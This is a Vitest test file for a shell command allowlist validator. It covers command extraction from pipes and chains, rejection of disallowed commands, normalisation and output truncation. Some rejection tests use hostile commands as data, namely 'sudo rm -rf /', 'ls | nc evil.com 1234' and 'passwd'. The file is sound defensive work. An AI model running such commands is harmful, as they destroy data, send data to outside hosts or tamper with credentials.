import { describe, expect, it } from "vitest";
import {
  extractCommandNames,
  normalizeAllowedCommands,
  truncateOutput,
  validateCommandAllowlist,
} from "./shell.js";

const DEFAULT_ALLOWLIST = new Set([
  "ls", "cat", "head", "tail", "grep", "git", "node", "echo",
]);

describe("extractCommandNames", () => {
  it("extracts a simple command", () => {
    expect(extractCommandNames({ command: "ls" })).toEqual(["ls"]);
  });

  it("extracts a command with arguments", () => {
    expect(extractCommandNames({ command: "ls -la /tmp" })).toEqual(["ls"]);
  });

  it("extracts commands from a pipe", () => {
    expect(extractCommandNames({ command: "ls | grep foo" })).toEqual([
      "ls",
      "grep",
    ]);
  });

  it("extracts commands from && chain", () => {
    expect(
      extractCommandNames({ command: "git add . && git commit -m 'msg'" }),
    ).toEqual(["git", "git"]);
  });

  it("extracts commands from ; chain", () => {
    expect(extractCommandNames({ command: "echo a; echo b" })).toEqual([
      "echo",
      "echo",
    ]);
  });

  it("extracts commands from || chain", () => {
    expect(extractCommandNames({ command: "cat file || echo fallback" })).toEqual([
      "cat",
      "echo",
    ]);
  });

  it("strips env var assignments before the command", () => {
    expect(
      extractCommandNames({ command: "FOO=bar node script.js" }),
    ).toEqual(["node"]);
  });

  it("strips multiple env var assignments", () => {
    expect(
      extractCommandNames({ command: "FOO=bar BAZ=qux node script.js" }),
    ).toEqual(["node"]);
  });

  it("uses basename for full-path commands", () => {
    expect(extractCommandNames({ command: "/usr/bin/ls" })).toEqual(["ls"]);
  });

  it("handles double-quoted command names", () => {
    expect(extractCommandNames({ command: '"ls" -la' })).toEqual(["ls"]);
  });

  it("handles single-quoted command names", () => {
    expect(extractCommandNames({ command: "'ls' -la" })).toEqual(["ls"]);
  });

  it("handles complex pipe chains", () => {
    expect(
      extractCommandNames({ command: "find . -name '*.ts' | xargs grep TODO | sort | uniq" }),
    ).toEqual(["find", "xargs", "sort", "uniq"]);
  });

  it("returns empty array for empty input", () => {
    expect(extractCommandNames({ command: "" })).toEqual([]);
  });
});

describe("validateCommandAllowlist", () => {
  it("allows a permitted command", () => {
    expect(() =>
      validateCommandAllowlist({ command: "ls -la", allowedCommands: DEFAULT_ALLOWLIST }),
    ).not.toThrow();
  });

  it("allows piped permitted commands", () => {
    expect(() =>
      validateCommandAllowlist({ command: "ls | grep foo", allowedCommands: DEFAULT_ALLOWLIST }),
    ).not.toThrow();
  });

  it("allows commands with env var prefixes", () => {
    expect(() =>
      validateCommandAllowlist({
        command: "NODE_ENV=test node index.js",
        allowedCommands: DEFAULT_ALLOWLIST,
      }),
    ).not.toThrow();
  });

  it("rejects a disallowed command", () => {
    expect(() =>
      validateCommandAllowlist({ command: "sudo rm -rf /", allowedCommands: DEFAULT_ALLOWLIST }),
    ).toThrow("Command not in allowlist: sudo");
  });

  it("rejects if any command in a pipe is disallowed", () => {
    expect(() =>
      validateCommandAllowlist({ command: "ls | nc evil.com 1234", allowedCommands: DEFAULT_ALLOWLIST }),
    ).toThrow("Command not in allowlist: nc");
  });

  it("rejects if any command in a chain is disallowed", () => {
    expect(() =>
      validateCommandAllowlist({ command: "echo ok && passwd", allowedCommands: DEFAULT_ALLOWLIST }),
    ).toThrow("Command not in allowlist: passwd");
  });

  it("throws on empty command", () => {
    expect(() =>
      validateCommandAllowlist({ command: "", allowedCommands: DEFAULT_ALLOWLIST }),
    ).toThrow("No executable command found");
  });

  it("provides the allowed list in the hint", () => {
    try {
      validateCommandAllowlist({ command: "nmap localhost", allowedCommands: DEFAULT_ALLOWLIST });
    } catch (error) {
      expect((error as any).hint).toContain("Allowed commands:");
      expect((error as any).hint).toContain("ls");
    }
  });

  it("validates against a custom allowlist", () => {
    const custom = new Set(["docker", "kubectl"]);

    expect(() =>
      validateCommandAllowlist({ command: "docker ps", allowedCommands: custom }),
    ).not.toThrow();

    expect(() =>
      validateCommandAllowlist({ command: "ls -la", allowedCommands: custom }),
    ).toThrow("Command not in allowlist: ls");
  });
});

describe("normalizeAllowedCommands", () => {
  it("returns a Set of command basenames", () => {
    const result = normalizeAllowedCommands({ commands: ["ls", "git", "node"] });
    expect(result).toEqual(new Set(["ls", "git", "node"]));
  });

  it("trims whitespace from entries", () => {
    const result = normalizeAllowedCommands({ commands: ["  ls  ", " git "] });
    expect(result).toEqual(new Set(["ls", "git"]));
  });

  it("skips empty entries", () => {
    const result = normalizeAllowedCommands({ commands: ["ls", "", "  ", "git"] });
    expect(result).toEqual(new Set(["ls", "git"]));
  });

  it("normalizes full paths to basenames", () => {
    const result = normalizeAllowedCommands({ commands: ["/usr/bin/ls", "/usr/local/bin/node"] });
    expect(result).toEqual(new Set(["ls", "node"]));
  });

  it("deduplicates entries", () => {
    const result = normalizeAllowedCommands({ commands: ["ls", "ls", "/usr/bin/ls"] });
    expect(result).toEqual(new Set(["ls"]));
    expect(result.size).toBe(1);
  });

  it("returns empty set for empty input", () => {
    const result = normalizeAllowedCommands({ commands: [] });
    expect(result.size).toBe(0);
  });
});

describe("truncateOutput", () => {
  it("returns short output unchanged", () => {
    expect(truncateOutput({ output: "hello" })).toBe("hello");
  });

  it("truncates output exceeding the limit", () => {
    const longOutput = "x".repeat(256 * 1024);
    const result = truncateOutput({ output: longOutput });
    expect(result.length).toBeLessThan(longOutput.length);
    expect(result).toContain("... [truncated]");
  });

  it("handles empty output", () => {
    expect(truncateOutput({ output: "" })).toBe("");
  });
});
